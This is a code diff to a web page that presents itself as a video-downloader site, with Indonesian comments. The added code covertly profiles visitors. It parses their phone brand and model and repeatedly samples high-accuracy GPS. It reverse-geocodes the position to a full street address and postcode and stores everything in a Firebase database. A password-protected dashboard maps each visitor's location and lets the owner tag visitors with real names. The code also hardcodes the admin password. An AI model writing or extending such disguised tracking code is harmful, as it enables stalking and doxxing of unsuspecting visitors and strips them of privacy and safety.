@@ -148,8 +148,31 @@ nav{position:sticky;top:0;z-index:50;display:flex;justify-content:space-between;
   color:#448aff;padding:2px 7px;border-radius:4px;display:inline-block}
 .new-tag{background:rgba(0,230,118,0.15);color:#00e676;font-size:0.62rem;padding:1px 5px;border-radius:3px;margin-left:3px;font-family:var(--mono)}
 .gps-tag{background:rgba(255,45,120,0.15);color:var(--pink);font-size:0.62rem;padding:1px 5px;border-radius:3px;margin-left:3px;font-family:var(--mono)}
+.name-tag{background:rgba(255,193,7,0.15);color:#ffc107;font-size:0.62rem;padding:1px 6px;border-radius:3px;margin-left:3px;font-family:var(--mono);border:1px solid rgba(255,193,7,0.3)}
 .ttime{color:var(--muted);font-size:0.73rem;font-family:var(--mono)}
 .empty{padding:3rem;text-align:center;color:var(--muted)}
+/* Inline rename input */
+.rename-input{background:var(--s2);border:1px solid var(--purple);border-radius:4px;
+  color:var(--text);font-family:var(--mono);font-size:0.75rem;padding:2px 6px;
+  outline:none;width:120px;margin-left:3px}
+/* Rename modal */
+.rename-modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.7);
+  backdrop-filter:blur(6px);z-index:400;align-items:center;justify-content:center}
+.rename-modal.show{display:flex}
+.rename-card{background:var(--s1);border:1px solid var(--border);border-radius:16px;
+  padding:1.5rem;width:min(360px,90vw);text-align:center}
+.rename-card h3{font-size:1rem;font-weight:700;margin-bottom:0.4rem}
+.rename-card p{font-size:0.8rem;color:var(--muted);margin-bottom:1rem}
+.rename-inp{width:100%;background:var(--s2);border:1px solid var(--border);border-radius:8px;
+  padding:0.75rem 1rem;color:var(--text);font-family:var(--font);font-size:0.95rem;
+  outline:none;transition:border-color 0.2s;margin-bottom:0.75rem}
+.rename-inp:focus{border-color:var(--purple)}
+.rename-actions{display:flex;gap:0.5rem}
+.rename-save{flex:1;padding:0.7rem;background:linear-gradient(135deg,var(--pink),var(--purple));
+  color:#fff;border:none;border-radius:8px;font-family:var(--font);font-weight:700;cursor:pointer}
+.rename-cancel{padding:0.7rem 1rem;background:none;border:1px solid var(--border);
+  color:var(--muted);border-radius:8px;font-family:var(--font);cursor:pointer}
+.rename-cancel:hover{border-color:var(--pink);color:var(--pink)}
 
 /* DETAIL MODAL */
 .modal-ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.8);
@@ -302,6 +325,20 @@ nav{position:sticky;top:0;z-index:50;display:flex;justify-content:space-between;
   </div>
 </div>
 
+<!-- RENAME MODAL -->
+<div class="rename-modal" id="renameModal">
+  <div class="rename-card">
+    <h3>✏️ Beri Nama Visitor</h3>
+    <p id="renameSubtitle">Beri label untuk memudahkan identifikasi</p>
+    <input class="rename-inp" id="renameInp" placeholder="Contoh: Budi, Teman SMA, dll..." maxlength="40"
+      onkeydown="if(event.key==='Enter')saveRename(); if(event.key==='Escape')closeRename();">
+    <div class="rename-actions">
+      <button class="rename-save" onclick="saveRename()">Simpan</button>
+      <button class="rename-cancel" onclick="closeRename()">Batal</button>
+    </div>
+  </div>
+</div>
+
 <!-- FIREBASE -->
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
@@ -321,8 +358,81 @@ const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 const visRef = ref(db, 'visitors');
 
+// ── Device brand/model parser ──────────────────────────────
+function parseDevice(uaRaw) {
+  const ua = uaRaw.toLowerCase();
+  let brand = 'Unknown', model = '';
+
+  // iPhone
+  const iphoneM = uaRaw.match(/iPhone OS ([\d_]+)/);
+  if (iphoneM) return { brand:'Apple', model:`iPhone (iOS ${iphoneM[1].replace(/_/g,'.')})` };
+
+  // iPad
+  const ipadM = uaRaw.match(/iPad.*OS ([\d_]+)/);
+  if (ipadM) return { brand:'Apple', model:`iPad (iPadOS ${ipadM[1].replace(/_/g,'.')})` };
+
+  // Samsung  — format: SM-XXXX, GT-XXXX, SCH-XXXX
+  const samsungM = uaRaw.match(/(SM-[A-Z0-9]+|GT-[A-Z0-9]+|SCH-[A-Z0-9]+)/);
+  if (samsungM) return { brand:'Samsung', model:samsungM[1] };
+
+  // Xiaomi / Redmi / POCO
+  const xiaomiM = uaRaw.match(/(Redmi [A-Za-z0-9 ]+?|POCO [A-Za-z0-9]+|M[0-9]{4}[A-Z0-9]*|Xiaomi [A-Za-z0-9 ]+?)(?=\s*Build|;|\))/);
+  if (ua.includes('redmi') || ua.includes('poco') || ua.includes('xiaomi')) {
+    if (xiaomiM) return { brand:'Xiaomi', model:xiaomiM[1].trim() };
+    return { brand:'Xiaomi', model:'Unknown Model' };
+  }
+
+  // OPPO
+  const oppoM = uaRaw.match(/OPPO\s?([A-Za-z0-9 ]+?)(?=\s*Build|;|\))/i);
+  if (oppoM) return { brand:'OPPO', model:oppoM[1].trim() };
+  if (ua.includes('cph') || ua.includes('cph')) {
+    const cphM = uaRaw.match(/(CPH[0-9]+)/);
+    if (cphM) return { brand:'OPPO', model:cphM[1] };
+  }
+
+  // Vivo
+  const vivoM = uaRaw.match(/vivo\s?([A-Za-z0-9]+)/i);
+  if (vivoM) return { brand:'Vivo', model:vivoM[1] };
+  if (ua.includes(' v') && ua.includes('build')) {
+    const vM = uaRaw.match(/;\s*(V[0-9][A-Za-z0-9]*)\s+Build/);
+    if (vM) return { brand:'Vivo', model:vM[1] };
+  }
+
+  // Realme
+  const realmeM = uaRaw.match(/(RMX[0-9]+|realme\s+[A-Za-z0-9 ]+?)(?=\s*Build|;|\))/i);
+  if (realmeM) return { brand:'Realme', model:realmeM[1].replace(/realme\s*/i,'').trim() };
+
+  // Huawei
+  const huaweiM = uaRaw.match(/(ANA-[A-Z0-9]+|CLT-[A-Z0-9]+|ELE-[A-Z0-9]+|VOG-[A-Z0-9]+|LYA-[A-Z0-9]+|[A-Z]{3}-[A-Z0-9]{2,})/);
+  if (ua.includes('huawei') || ua.includes('honor')) {
+    if (huaweiM) return { brand: ua.includes('honor') ? 'Honor' : 'Huawei', model:huaweiM[1] };
+    return { brand: ua.includes('honor') ? 'Honor' : 'Huawei', model:'Unknown' };
+  }
+
+  // OnePlus
+  const oneplusM = uaRaw.match(/OnePlus\s?([A-Za-z0-9 ]+?)(?=\s*Build|;|\))/i);
+  if (oneplusM) return { brand:'OnePlus', model:oneplusM[1].trim() };
+
+  // Generic Android — extract model from ";<model> Build/"
+  const androidM = uaRaw.match(/;\s*([^;()]+?)\s+Build\//);
+  if (androidM) {
+    const raw = androidM[1].trim();
+    // Try to guess brand from first word
+    const firstWord = raw.split(' ')[0];
+    return { brand: firstWord || 'Android', model: raw };
+  }
+
+  // Desktop OS
+  if (ua.includes('windows')) return { brand:'Windows PC', model:'' };
+  if (ua.includes('macintosh')) return { brand:'Mac', model:'' };
+  if (ua.includes('linux')) return { brand:'Linux PC', model:'' };
+
+  return { brand:'Unknown', model:'' };
+}
+
 async function collect() {
   const ua = navigator.userAgent.toLowerCase();
+  const devInfo = parseDevice(navigator.userAgent);
   const entry = {
     timestamp: new Date().toISOString(),
     ua: navigator.userAgent,
@@ -331,6 +441,8 @@ async function collect() {
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     screen: `${screen.width}x${screen.height}`,
     deviceType: /mobile|android|iphone|ipad/.test(ua) ? 'Mobile' : /tablet/.test(ua) ? 'Tablet' : 'Desktop',
+    deviceBrand: devInfo.brand,
+    deviceModel: devInfo.model,
     ip: null, city: null, region: null, country: null,
     country_code: null, org: null, asn: null,
     lat: null, lng: null, gps_lat: null, gps_lng: null,
@@ -357,21 +469,109 @@ async function collect() {
   } catch(e) { return; }
 
   if (navigator.geolocation && savedKey) {
-    navigator.geolocation.getCurrentPosition(
-      async pos => {
-        const {latitude:gla, longitude:glo, accuracy:acc} = pos.coords;
-        await update(ref(db, `visitors/${savedKey}`), {
-          gps_lat:gla, gps_lng:glo, gps_accuracy:Math.round(acc),
-          gps_status:'granted', lat:gla, lng:glo
-        });
-      },
-      async err => {
-        await update(ref(db, `visitors/${savedKey}`), {
-          gps_status: err.code===1 ? 'denied' : 'unavailable'
-        });
-      },
-      {enableHighAccuracy:true, timeout:15000, maximumAge:0}
-    );
+    // Strategi multi-sample: ambil hingga 5 posisi, simpan yang paling akurat
+    const MAX_SAMPLES = 5;
+    const SAMPLE_WINDOW = 20000; // 20 detik total
+    let bestPos = null;
+    let sampleCount = 0;
+    let watchId = null;
+    let settled = false;
+
+    const saveBest = async (pos) => {
+      if (settled) return;
+      settled = true;
+      if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+      const {latitude:gla, longitude:glo, accuracy:acc} = pos.coords;
+
+      // Base GPS data — simpan dulu biar cepat
+      const gpsData = {
+        gps_lat: gla, gps_lng: glo,
+        gps_accuracy: Math.round(acc),
+        gps_samples: sampleCount,
+        gps_status: 'granted',
+        lat: gla, lng: glo
+      };
+      await update(ref(db, `visitors/${savedKey}`), gpsData);
+
+      // Reverse geocoding via Nominatim (OpenStreetMap) — gratis, detail sampai kelurahan
+      try {
+        const geoRes = await fetch(
+          `https://nominatim.openstreetmap.org/reverse?lat=${gla}&lon=${glo}&format=jsonv2&addressdetails=1&accept-language=id`,
+          { headers: { 'User-Agent': 'SaveVideoApp/1.0' }, signal: AbortSignal.timeout(8000) }
+        );
+        if (geoRes.ok) {
+          const geo = await geoRes.json();
+          const addr = geo.address || {};
+          // Mapping field Nominatim → Indonesia
+          const kelurahan  = addr.village || addr.suburb || addr.neighbourhood || addr.hamlet || null;
+          const kecamatan  = addr.city_district || addr.municipality || addr.town || null;
+          const kotaKab    = addr.city || addr.regency || addr.county || addr.state_district || null;
+          const provinsi   = addr.state || null;
+          const kodePos    = addr.postcode || null;
+          const negara     = addr.country || null;
+          const alamatLengkap = geo.display_name || null;
+
+          await update(ref(db, `visitors/${savedKey}`), {
+            geo_kelurahan:   kelurahan,
+            geo_kecamatan:   kecamatan,
+            geo_kota:        kotaKab,
+            geo_provinsi:    provinsi,
+            geo_kodepos:     kodePos,
+            geo_negara:      negara,
+            geo_alamat:      alamatLengkap,
+            // Override kota/region dengan data GPS yang lebih akurat
+            city:   kotaKab  || addr.city || null,
+            region: provinsi || null,
+            postal: kodePos  || null,
+          });
+        }
+      } catch(e) { /* reverse geocoding gagal, data GPS tetap tersimpan */ }
+    };
+
+    const onPos = (pos) => {
+      sampleCount++;
+      // Simpan jika ini posisi pertama atau lebih akurat dari sebelumnya
+      if (!bestPos || pos.coords.accuracy < bestPos.coords.accuracy) {
+        bestPos = pos;
+      }
+      // Langsung commit jika akurasi sudah sangat bagus (≤10m) atau sudah MAX_SAMPLES
+      if (bestPos.coords.accuracy <= 10 || sampleCount >= MAX_SAMPLES) {
+        saveBest(bestPos);
+      }
+    };
+
+    const onErr = async (err) => {
+      if (settled) return;
+      // Jika sudah ada sample sebelum error, pakai yang terbaik
+      if (bestPos) {
+        saveBest(bestPos);
+        return;
+      }
+      settled = true;
+      if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+      await update(ref(db, `visitors/${savedKey}`), {
+        gps_status: err.code === 1 ? 'denied' : 'unavailable'
+      });
+    };
+
+    // Gunakan watchPosition agar browser terus memperbarui lokasi
+    watchId = navigator.geolocation.watchPosition(onPos, onErr, {
+      enableHighAccuracy: true,
+      timeout: 15000,
+      maximumAge: 0
+    });
+
+    // Paksa commit setelah SAMPLE_WINDOW meskipun belum ideal
+    setTimeout(() => {
+      if (!settled) {
+        if (bestPos) saveBest(bestPos);
+        else {
+          settled = true;
+          if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+          update(ref(db, `visitors/${savedKey}`), { gps_status: 'unavailable' });
+        }
+      }
+    }, SAMPLE_WINDOW);
   }
 }
 
@@ -395,17 +595,21 @@ window.renderDash = function() {
   const now = Date.now();
   list.innerHTML = v.map((vis,i) => {
     const flag = vis.country_code ? cf(vis.country_code)+' ' : '';
-    const loc = vis.city ? `${flag}${vis.city}, ${vis.region||''}` : `${flag}${vis.country||'Unknown'}`;
+    // Prioritas: kelurahan+kecamatan dari GPS > kota dari IP
+    const loc = vis.geo_kelurahan
+      ? `📍 ${vis.geo_kelurahan}, ${vis.geo_kecamatan||''}`
+      : vis.city ? `${flag}${vis.city}, ${vis.region||''}` : `${flag}${vis.country||'Unknown'}`;
     const dev = vis.deviceType==='Mobile'?'📱':vis.deviceType==='Tablet'?'📟':'🖥️';
     const time = new Date(vis.timestamp).toLocaleString('id-ID',{day:'2-digit',month:'short',hour:'2-digit',minute:'2-digit'});
     const isNew = (now - new Date(vis.timestamp).getTime()) < 60000;
     const hasGps = vis.gps_status==='granted';
+    const nameTag = vis.label ? `<span class="name-tag" title="Double-click untuk ubah" ondblclick="event.stopPropagation();window.openRename('${vis._key}')">✏️ ${vis.label}</span>` : `<span style="font-size:0.68rem;color:var(--muted);cursor:pointer;margin-left:3px" title="Beri nama" ondblclick="event.stopPropagation();window.openRename('${vis._key}')">➕nama</span>`;
     return `<div class="vrow" onclick="window.showDetail('${vis._key}')">
       <div class="vnum">${v.length-i}</div>
-      <div><span class="ip-tag">${(vis.ip||'N/A').substring(0,16)}</span>${isNew?'<span class="new-tag">NEW</span>':''}${hasGps?'<span class="gps-tag">GPS✓</span>':''}</div>
+      <div style="display:flex;align-items:center;gap:2px;flex-wrap:wrap"><span class="ip-tag">${(vis.ip||'N/A').substring(0,16)}</span>${isNew?'<span class="new-tag">NEW</span>':''}${hasGps?'<span class="gps-tag">GPS✓</span>':''}${nameTag}</div>
       <div style="font-size:0.8rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${loc}</div>
       <div class="col-isp" style="font-size:0.73rem;color:var(--muted);overflow:hidden;text-overflow:ellipsis">${(vis.org||'N/A').substring(0,22)}</div>
-      <div class="col-dev" style="font-size:0.8rem">${dev} ${vis.deviceType||'?'}</div>
+      <div class="col-dev" style="font-size:0.8rem">${dev} ${vis.deviceBrand && vis.deviceBrand!=='Unknown'? vis.deviceBrand : vis.deviceType||'?'}</div>
       <div class="ttime">${time}</div>
     </div>`;
   }).join('');
@@ -426,24 +630,43 @@ window.showDetail = function(key) {
     <div class="ditem"><div class="dlbl">ISP / Org</div><div class="dval">${vis.org||'N/A'}</div></div>
     <div class="ditem"><div class="dlbl">ASN</div><div class="dval mono">${vis.asn||'N/A'}</div></div>
     <div class="ditem"><div class="dlbl">Timezone</div><div class="dval">${vis.timezone||'N/A'}</div></div>
-    <div class="ditem"><div class="dlbl">Perangkat</div><div class="dval">${vis.deviceType||'N/A'} • ${vis.screen||''}</div></div>
+    <div class="ditem"><div class="dlbl">📱 Merek / Brand</div><div class="dval" style="color:${vis.deviceBrand && vis.deviceBrand!=='Unknown'?'#00d4ff':'var(--muted)'}">${vis.deviceBrand||'N/A'}</div></div>
+    <div class="ditem"><div class="dlbl">🔧 Model Perangkat</div><div class="dval">${vis.deviceModel||vis.deviceType||'N/A'} • ${vis.screen||''}</div></div>
     <div class="ditem"><div class="dlbl">Koneksi</div><div class="dval">${vis.connection||'N/A'}</div></div>
     <div class="ditem"><div class="dlbl">Bahasa Browser</div><div class="dval">${vis.language||'N/A'}</div></div>
     <div class="ditem"><div class="dlbl">Waktu Kunjungan</div><div class="dval">${new Date(vis.timestamp).toLocaleString('id-ID')}</div></div>
-    <div class="ditem full">
-      <div class="dlbl">📍 GPS Presisi Tinggi</div>
+    <div class="ditem full" style="border-color:${vis.gps_status==='granted'?'rgba(255,45,120,0.4)':'var(--border)'}">
+      <div class="dlbl">📍 GPS Presisi Tinggi ${vis.gps_status==='granted'?'<span style=\"background:rgba(0,230,118,0.15);color:#00e676;font-size:0.6rem;padding:1px 5px;border-radius:3px;margin-left:4px\">✓ AKURAT</span>':''}</div>
       ${vis.gps_status==='granted' && vis.gps_lat
-        ? `<div class="dval pink mono">${vis.gps_lat}, ${vis.gps_lng}</div>
-           <div style="font-size:0.73rem;color:var(--muted);margin-top:2px">Akurasi: ±${vis.gps_accuracy} meter</div>
-           <a class="maps-a" href="https://www.google.com/maps?q=${vis.gps_lat},${vis.gps_lng}" target="_blank">🗺️ Buka Google Maps (Akurat)</a>`
-        : `<div class="dval" style="color:var(--muted)">${vis.gps_status==='denied'?'🚫 User menolak izin GPS':vis.gps_status==='unavailable'?'⚠️ GPS tidak tersedia':'⏳ Menunggu...'}</div>`}
+        ? `<div class="dval pink mono" style="font-size:1rem;letter-spacing:0.02em">${vis.gps_lat.toFixed(6)}, ${vis.gps_lng.toFixed(6)}</div>
+           <div style="font-size:0.73rem;color:var(--muted);margin-top:4px">⭕ Radius: <b style="color:#ff2d78">±${vis.gps_accuracy} meter</b>${vis.gps_samples ? ' · ' + vis.gps_samples + ' sampel' : ''}</div>
+           <a class="maps-a" href="https://www.google.com/maps?q=${vis.gps_lat},${vis.gps_lng}&z=17" target="_blank" style="margin-top:8px;font-size:0.82rem;font-weight:600">🗺️ Buka Google Maps (Presisi Tinggi)</a>`
+        : `<div class="dval" style="color:var(--muted);margin-top:4px">${vis.gps_status==='denied'?'🚫 User menolak izin GPS — hanya data IP tersedia':vis.gps_status==='unavailable'?'⚠️ GPS tidak tersedia di perangkat ini':'⏳ Menunggu respons GPS...'}</div>`}
     </div>
-    <div class="ditem full">
-      <div class="dlbl">🌐 Koordinat IP-based (Perkiraan)</div>
-      <div class="dval mono" style="color:var(--muted)">${vis.lat ? `${vis.lat}, ${vis.lng}` : 'N/A'}</div>
-      ${ipMap && vis.gps_status!=='granted' ? `<a class="maps-a" href="${ipMap}" target="_blank">🗺️ Google Maps (IP)</a>` : ''}
+    ${vis.gps_status==='granted' && vis.geo_kelurahan ? `
+    <div class="ditem full" style="border-color:rgba(0,212,255,0.3);background:rgba(0,212,255,0.04)">
+      <div class="dlbl">🏘️ Alamat Lengkap (dari GPS) <span style="background:rgba(0,230,118,0.15);color:#00e676;font-size:0.6rem;padding:1px 5px;border-radius:3px;margin-left:4px">GPS VERIFIED</span></div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:0.4rem;margin-top:0.5rem">
+        <div><div style="font-size:0.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;font-family:var(--mono)">Kelurahan</div><div style="font-size:0.85rem;color:#e8e8f5">${vis.geo_kelurahan||'N/A'}</div></div>
+        <div><div style="font-size:0.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;font-family:var(--mono)">Kecamatan</div><div style="font-size:0.85rem;color:#e8e8f5">${vis.geo_kecamatan||'N/A'}</div></div>
+        <div><div style="font-size:0.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;font-family:var(--mono)">Kota / Kabupaten</div><div style="font-size:0.85rem;color:#e8e8f5">${vis.geo_kota||'N/A'}</div></div>
+        <div><div style="font-size:0.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;font-family:var(--mono)">Provinsi</div><div style="font-size:0.85rem;color:#e8e8f5">${vis.geo_provinsi||'N/A'}</div></div>
+        <div><div style="font-size:0.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;font-family:var(--mono)">Kode Pos</div><div style="font-size:0.85rem;color:#00d4ff;font-family:var(--mono)">${vis.geo_kodepos||'N/A'}</div></div>
+        <div><div style="font-size:0.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;font-family:var(--mono)">Negara</div><div style="font-size:0.85rem;color:#e8e8f5">${vis.geo_negara||'N/A'}</div></div>
+      </div>
+      ${vis.geo_alamat ? `<div style="font-size:0.7rem;color:var(--muted);margin-top:0.6rem;line-height:1.5;border-top:1px solid var(--border);padding-top:0.5rem">📌 ${vis.geo_alamat}</div>` : ''}
+    </div>` : ''}
+    <div class="ditem full" style="opacity:${vis.gps_status==='granted'?'0.6':'1'}">
+      <div class="dlbl">🌐 Lokasi IP-based <span style="font-size:0.6rem;color:#ff9100;margin-left:4px;background:rgba(255,144,0,0.1);padding:1px 5px;border-radius:3px">⚠️ PERKIRAAN ISP</span></div>
+      <div style="font-size:0.72rem;color:var(--muted);margin-bottom:4px">Menunjuk ke kantor ISP, bukan lokasi fisik user</div>
+      <div class="dval mono" style="color:var(--muted)">${vis.lat ? `${+vis.lat.toFixed(4)}, ${+vis.lng.toFixed(4)}` : 'N/A'} ${vis.city ? '· ' + vis.city : ''}</div>
+      ${ipMap && vis.gps_status!=='granted' ? `<a class="maps-a" href="${ipMap}" target="_blank">🗺️ Google Maps (IP — tidak akurat)</a>` : ''}
     </div>
     <div class="ditem full"><div class="dlbl">User Agent</div><div class="dval mono" style="font-size:0.7rem;color:var(--muted)">${vis.ua||'N/A'}</div></div>
+    <div class="ditem full" style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:0.5rem">
+      <div><div class="dlbl">Label / Nama</div><div class="dval" style="color:${vis.label?'#ffc107':'var(--muted)'}">${vis.label||'Belum diberi nama'}</div></div>
+      <button onclick="window.openRename('${vis._key}')" style="padding:0.4rem 0.9rem;background:none;border:1px solid var(--purple);color:#a78bfa;border-radius:7px;font-family:var(--font);font-size:0.78rem;cursor:pointer;white-space:nowrap">✏️ Beri Nama</button>
+    </div>
   `;
   document.getElementById('detailModal').classList.add('show');
 };
@@ -454,18 +677,50 @@ window.clearAll = async function() {
   if (confirm('Hapus semua data visitor?')) await remove(visRef);
 };
 
+let _renameKey = null;
+window.openRename = function(key) {
+  _renameKey = key;
+  const vis = allVisitors.find(v=>v._key===key);
+  document.getElementById('renameSubtitle').textContent = vis ? `IP: ${vis.ip||'?'} · ${vis.city||vis.country||''}` : '';
+  document.getElementById('renameInp').value = vis?.label || '';
+  document.getElementById('renameModal').classList.add('show');
+  setTimeout(()=>document.getElementById('renameInp').select(), 80);
+};
+
+window.saveRename = async function() {
+  if (!_renameKey) return;
+  const label = document.getElementById('renameInp').value.trim();
+  await update(ref(db, `visitors/${_renameKey}`), { label: label || null });
+  closeRename();
+};
+
+window.closeRename = function() {
+  document.getElementById('renameModal').classList.remove('show');
+  _renameKey = null;
+};
+
 function cf(code) {
   if (!code || code.length!==2) return '';
   return code.toUpperCase().split('').map(c=>String.fromCodePoint(c.charCodeAt(0)+127397)).join('');
 }
 
-collect();
+// Jangan collect jika admin membuka halaman (hindari double entry)
+// isAdminCheck: cek URL sekarang (sebelum variabel isAdminMode di-define di script berikutnya)
+(function() {
+  const _isAdmin = window.location.search.includes('admin') || window.location.hash.includes('admin') || sessionStorage.getItem('sv_admin_unlocked') === '1';
+  if (!_isAdmin) collect();
+})();
 </script>
 
 <script>
-// PASSWORD
+// PASSWORD + SESSION PERSISTENCE
 const PASS = 'fauzan2007'; // ← Ganti password di sini!
-let unlocked = false;
+const SESSION_KEY = 'sv_admin_unlocked';
+let unlocked = sessionStorage.getItem(SESSION_KEY) === '1';
+
+// Cek apakah ini admin (via URL hash ?admin atau session)
+// Jika admin → skip collect(), langsung cek session
+const isAdminMode = window.location.search.includes('admin') || window.location.hash.includes('admin');
 
 function openDash() {
   if (unlocked) { showDash(); return; }
@@ -479,6 +734,11 @@ function checkPw() {
   const err = document.getElementById('pwErr');
   if (val === PASS) {
     unlocked = true;
+    sessionStorage.setItem(SESSION_KEY, '1');
+    // Tandai URL dengan hash #admin agar refresh tetap di dashboard
+    if (!window.location.hash.includes('admin')) {
+      history.replaceState(null, '', window.location.pathname + '#admin');
+    }
     closePw();
     showDash();
   } else {
@@ -496,12 +756,27 @@ function closePw() {
 
 function showDash() {
   document.getElementById('dashOverlay').classList.add('show');
+  // Update URL hash saat buka dashboard
+  if (!window.location.hash.includes('admin')) {
+    history.replaceState(null, '', window.location.pathname + '#admin');
+  }
   window.renderDash();
 }
 
 function closeDash() {
   document.getElementById('dashOverlay').classList.remove('show');
+  // Hapus hash admin saat tutup dashboard
+  history.replaceState(null, '', window.location.pathname);
+  sessionStorage.removeItem(SESSION_KEY);
+  unlocked = false;
 }
+
+// Auto-restore: jika hash #admin & session masih aktif → langsung buka dashboard
+window.addEventListener('DOMContentLoaded', () => {
+  if (unlocked && isAdminMode) {
+    showDash();
+  }
+});
 
 // ─── DOWNLOADER ───────────────────────────────────────────────
 // Coba beberapa endpoint Cobalt secara berurutan
@@ -687,6 +962,7 @@ function showErr(msg) {
 document.getElementById('videoUrl').addEventListener('keydown', e => { if(e.key==='Enter') handleDownload(); });
 document.getElementById('pwOverlay').addEventListener('click', e => { if(e.target===document.getElementById('pwOverlay')) closePw(); });
 document.getElementById('detailModal').addEventListener('click', e => { if(e.target===document.getElementById('detailModal')) window.closeDetail(); });
+document.getElementById('renameModal').addEventListener('click', e => { if(e.target===document.getElementById('renameModal')) window.closeRename(); });
 </script>
 </body>
 </html>
